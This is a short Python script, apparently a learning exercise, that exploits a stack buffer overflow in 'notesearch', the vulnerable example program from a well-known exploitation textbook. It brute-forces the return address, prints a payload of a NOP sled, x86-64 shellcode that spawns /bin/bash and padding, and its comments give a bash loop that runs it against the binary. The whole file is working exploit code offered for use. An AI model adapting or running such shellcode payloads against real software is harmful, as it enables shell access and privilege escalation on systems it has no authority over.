#!/usr/bin/python


## script to bruteforce the return_address
## script increments a base address by a value
## and generates a payload for notesearch
# e.g. usage in bash:
# for i in $(seq 0 16 1600);
# do echo address_increment: $i;
# ./notesearch $(./memaddress.py -i $i -a 0x7fffffffe100); done

# in my case, the correct increment is 864


import struct
from optparse import OptionParser

parser = OptionParser()
parser.add_option("-a", "--address", type="int", help="start address -> highest address")
parser.add_option("-i", "--increment", type="int", help="step size to increment address")

# Parsing arguments and setting base values
(options, args) = parser.parse_args()
if(options.increment):
    increment = options.increment
else:
    increment = 0
if(options.address):
    return_address_base = options.address
else:
    return_address_base = 0x00007fffffffe350

# Incrementing the Address
return_add = return_address_base + increment
# Storing address in little endian format
return_address = struct.pack("<Q", return_add)

## Payload length
payload_length = 120
## NOPs
nop_length = 56

##return_address = 8*return_address

##shellcode
buf = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0"
buf += "\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68"



## Nop sled
nop_sled = "\x90" * nop_length

## padding
padding = 'A' * (payload_length - nop_length - len(buf))

print nop_sled + buf + padding + return_address
